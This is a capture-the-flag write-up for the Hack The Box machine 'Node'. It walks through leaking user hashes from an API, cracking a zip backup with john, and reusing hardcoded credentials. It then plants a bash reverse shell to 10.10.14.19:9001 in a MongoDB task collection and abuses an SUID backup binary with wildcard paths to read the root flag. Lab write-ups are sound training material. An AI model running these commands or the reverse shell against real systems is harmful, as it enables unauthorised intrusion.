@@ -1,0 +1,114 @@
+HTB-Node-Writeup.txt
+
+ip : 10.10.10.58
+
+Nmap
+----
+- nmap scan revealed 2 open ports 
+	- ssh on port 22
+	- node js express framework on port 3000
+
+Enumeration
+-----------
+- visiting the site, it looks something like a social media under development called myplace 
+- we see a few usernames and pictures
+- signups are currently closed 
+- we see a link for login and clicking on it leads to a default login page
+- tried few default credentials but didnt work
+- checking the source we can see a few interesting js files running on the client 
+- app.js, home.js, login.js, admin.js, profile.js
+- on viewing the js files we notice that the home.js file mentions a path to view different users of the site 
+	
+	/api/users/latest
+
+- visiting the path we can see the user_id, username, password and is_admin values for the users   
+- sadly none of the users are admins so this info is of no use to us for now
+- in profile.js there is a call to /api/users/
+- checking that path we got one more user who is an admin 
+- we crack the users hash
+
+	creds : myP14ceAdm1nAcc0uNT : manchester
+
+Shell as mark
+-------------
+- we login to the site using the credentials
+- we get a download link whick looks to be a backup of the site 
+- we download the file, its a long ASCII text
+- we use head to read the first few lines of the file and it looks like base64 encoding 
+- we can decode the file and it gives us a zip file
+- tried to unzip the file but it asked for a password 
+- we use zip2john to crack the password of the zipfile 
+
+	 zip2john myplace.backup.zip > myplace.backup.hash
+	 john myplace.backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+- we get the password as magicword
+
+	creds : magicword
+
+- we unzip the file using the password 
+- while going through the files we see hardcoded credentials for mark and a backup_key in the app.js 
+
+	creds : mark : 5AYRft73VtFpc84k
+
+- we ssh into the machine with the credentials as mark
+- there is no flag in mark home directory
+
+Shell as Tom
+------------
+- there are two other users on the system frank and tom
+- we try to locate user.txt and found that its located in the tom users home 
+- we need to escalate our privileges to read the flag
+- we enumerate the network
+
+	ps auxww
+
+- we see 2 processes running as tom
+- running LinPeas against the system will also reveal this
+- out of the two most interesting one is /var/scheduler/app.js
+- this script will connect to mongodb and will execute a series of commands in every 30 seconds 
+- it will get items from tasks collection and for each doc it will pass the doc.cmd to exec to run it   
+- we will connect to mongodb using the credentials from before 
+
+	mongo -u mark -p 5AYRft73VtFpc84k scheduler
+
+- in mongodb tables are called as collections 
+- we can view collection using the following command 
+
+	show collections
+
+- we have one collection, lets check for objects inside collections 
+
+	db.tasks.find()
+
+- there are no objects in it 
+- we can try adding a reverse shell into the collection
+
+	> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.19/9001 0>&1'"})
+	WriteResult({ "nInserted" : 1 })
+	> db.tasks.find()
+	{ "_id" : ObjectId("60b6e61ee6bccdfbc52f13cb"), "cmd" : "bash -c 'bash -i >& /dev/tcp/10.10.14.19/9001 0>&1'" }	
+
+- we setup a listener using netcat 
+
+	nc -lnvp 9001
+
+- 30 seconds later we get a shell as top 
+- get the user flag 
+
+Priv-esc
+--------
+- we run id command and we can see that the tom user is in admin group
+- there is an suid binary /usr/local/bin/backup which is owned by root called from /var/www/myplace/app.js
+- checking app.js we can see that the file takes 3 arguments 
+- we run the following command 
+
+	/usr/local/bin/backup -q backup_token /tmp
+
+- trying to get the root flag with this method in a normal way will return a troll face because of a filtering in place so we have to up our game a little 
+- after a few tries we notice that the character * is not filtered
+- we get the root.txt by 
+
+	/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > root
+
+- on base64 decoding the root file we get the root flag
